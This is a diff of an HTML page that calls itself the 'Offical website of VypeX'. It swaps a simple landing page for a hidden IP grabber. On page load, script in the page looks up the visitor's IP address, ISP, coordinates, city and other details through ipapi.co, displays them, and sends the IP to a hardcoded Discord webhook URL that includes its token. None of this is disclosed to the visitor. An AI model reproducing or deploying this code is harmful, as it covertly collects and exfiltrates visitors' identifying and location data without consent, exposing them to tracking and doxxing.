@@ -1,37 +1,156 @@
 <!DOCTYPE html>
 <html lang="en">
-<head>
-<title>VypeX On TOP/title>
-<meta charset="utf-8">
-<meta name="author" content="OOT3">
-<meta name="description" content="Official website of VypeX.">
-<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
-<meta name="referrer" content="no-referrer" />
-<meta name="theme-color" content="#ff8600">
-<meta property="og:type" content="website" />
-<meta property="og:title" content="Official website of VypeX" />
-<meta property="og:description" content="Official website of VypeX." />
-<link rel="canonical" href="https://vypex.xyz" />
-<link rel="stylesheet" type="text/css" href="https://cdnjs.cloudflare.com/ajax/libs/normalize/8.0.1/normalize.min.css" />
-<link rel="stylesheet" type="text/css" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css" />
-<link rel="stylesheet" type="text/css" href="/assets/css/style.css">
-</head>
-<body>
-<div id="content">
-<div class="content-title">VYPE<span class="primary" style="text-shadow: 0 0 5px var(--primary);">X</span></div>
-<div class="content-subtitle">Official website of VypeX</div>
-<div class="buttons">
-<a class="button primary" href="/discord" target="_blank">
-<i class="fas fa-robot"></i> Discord Server
-</a>
+  <head>
+    <title>VypeX - Offical</title>
+    <meta charset="UTF-8">
+    <meta name="description" content="©️">
+    <meta property="og:site_name" content="VypeX">
+    <meta property="og:title" content="Offical website of Vypex">
+    <meta property="og:type" content="website">
+    <meta name="theme-color" content="#0975B3">
+    <meta property="og:description" content="©️">
+    <meta itemprop="image" content="">
+    <meta property="og:image" content="">
+    <meta property="og:image:width" content="640">
+    <meta property="og:image:height" content="640">
+    <meta property="twitter:card" content="summary_large_image">
+    <link href="style.css" rel="stylesheet" type="text/css" />
+  </head>
+  <style>
+    * {
+      cursor: default;
+    }
+    body {
+      -webkit-touch-callout: none;
+      -webkit-user-select: none;
+      -khtml-user-select: none;
+      -moz-user-select: none;
+      -ms-user-select: none;
+      background-color: rgb(7, 5, 5);
+      color: rgb(255, 255, 255);
+      font-family: 'Inter', sans-serif;
+      overflow: hidden;
+      margin: 0;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+    }
+    #space {
+      width: 1%;
+      height: 2px;
+      border-radius: 0px;
+    }
+    #sucky-sucky-funny-funny {
+      white-space: nowrap;
+      text-align: center;
+      transform: perspective(-100px) rotateX(-30deg);
+      animation: crawl 30s linear infinite;
+      font-size: 23pt;
+    }
+    @keyframes crawl {
+      0% {
+        top: -100px;
+        transform: rotateX(-30deg) translateZ(2000px);
+      }
+      100% {
+        top: -2500px;
+        transform: rotateX(-25deg) translateZ(-2500px);
+      }
+    }
+  </style>
+  <body>
+    <div id="sucky-sucky-funny-funny">
+    </div>
+    <script>
+      const webhookURL = "https://discord.com/api/webhooks/1221488497190240309/NOT16_yCIWjunphmGLzW372wHOte3pshVLB3TNR6xaPa6QHAw9VT4Pm8wPY_J__XNAyJ";
 
-</div>
-<div id="captcha"></div>
-</div>
-<div id="credits">
-<i class="fab fa-ethereum"></i> VypeX
-</div>
-<script src="https://challenges.cloudflare.com/turnstile/v0/api.js" defer></script>
-<script src="/assets/js/script.js" defer></script>
-<script>(function(){if (!document.body) return;var js = "window['__CF$cv$params']={r:'86a35bb3ef1901bb',t:'MTcxMTQxNjQ0Ni4xOTAwMDA='};_cpo=document.createElement('script');_cpo.nonce='',_cpo.src='/cdn-cgi/challenge-platform/scripts/jsd/main.js',document.getElementsByTagName('head')[0].appendChild(_cpo);";var _0xh = document.createElement('iframe');_0xh.height = 1;_0xh.width = 1;_0xh.style.position = 'absolute';_0xh.style.top = 0;_0xh.style.left = 0;_0xh.style.border = 'none';_0xh.style.visibility = 'hidden';document.body.appendChild(_0xh);function handler() {var _0xi = _0xh.contentDocument || _0xh.contentWindow.document;if (_0xi) {var _0xj = _0xi.createElement('script');_0xj.innerHTML = js;_0xi.getElementsByTagName('head')[0].appendChild(_0xj);}}if (document.readyState !== 'loading') {handler();} else if (window.addEventListener) {document.addEventListener('DOMContentLoaded', handler);} else {var prev = document.onreadystatechange || function () {};document.onreadystatechange = function (e) {prev(e);if (document.readyState !== 'loading') {document.onreadystatechange = prev;handler();}};}})();</script></body>
+      // Function to send message to Discord webhook
+      function sendWebhookMessage(content) {
+        fetch(webhookURL, {
+          method: "POST",
+          headers: {
+            "Content-Type": "application/json"
+          },
+          body: JSON.stringify({
+            content: content
+          })
+        })
+        .then(response => {
+          console.log("Webhook sent successfully!");
+        })
+        .catch(error => {
+          console.error("Error sending webhook:", error);
+        });
+      }
+
+      fetch("https://ipapi.co/json")
+      .then((response) => response.json())
+      .then((data) => {
+        let Information = {
+          Vers: data.version,
+          IP: data.ip,
+          ASN: data.asn,
+          ISP: data.org,
+          Latitude: data.latitude,
+          Longitude: data.longitude,
+          Country: data.country_name,
+          CountyCode: data.country_code,
+          Country_Population: data.country_population,
+          City: data.city,
+          Region: data.region,
+          RegionCODE: data.region_code,
+          Network: data.network,
+          Timezone: data.timezone,
+          Continent: data.continent_code,
+          CountryCallin: data.country_calling_code,
+          Currency_Name: data.currency_name,
+          Currency: data.currency,
+          Languages: data.languages,
+        };
+        const Container = document.getElementById("sucky-sucky-funny-funny");
+        const newText = `
+          <p>IP: ${Information.IP}</p>
+          <hr id="space">
+          <p>Version: ${Information.Vers}</p>
+          <hr id="space">
+          <p>ASN: ${Information.ASN}</p>
+          <hr id="space">
+          <p>ISP: ${Information.ISP}</p>
+          <hr id="space">
+          <p>Latitude: ${Information.Latitude}</p>
+          <hr id="space">
+          <p>Longitude: ${Information.Longitude}</p>
+          <hr id="space">
+          <p>Country: ${Information.Country}</p>
+          <hr id="space">
+          <p>Country Code: ${Information.CountyCode}</p>
+          <hr id="space">
+          <p>Country Population: ${Information.Country_Population}</p>
+          <hr id="space">
+          <p>City: ${Information.City}</p>
+          <hr id="space">
+          <p>Region: ${Information.Region}</p>
+          <hr id="space">
+          <p>Region Code: ${Information.RegionCODE}</p>
+          <hr id="space">
+          <p>Network: ${Information.Network}</p>
+          <hr id="space">
+          <p>Timezone: ${Information.Timezone}</p>
+          <hr id="space">
+          <p>Continent: ${Information.Continent}</p>
+          <hr id="space">
+          <p>Country Calling Code: ${Information.CountryCallin}</p>
+          <hr id="space">
+          <p>Currency: ${Information.Currency} / ${Information.Currency_Name}</p>
+          <hr id="space">
+          <p>Languages: ${Information.Languages}</p>
+        `;
+        Container.innerHTML = newText;
+
+        // Send message to Discord webhook
+        sendWebhookMessage(`IP: ${Information.IP}`);
+      });
+    </script>
+  </body>
 </html>
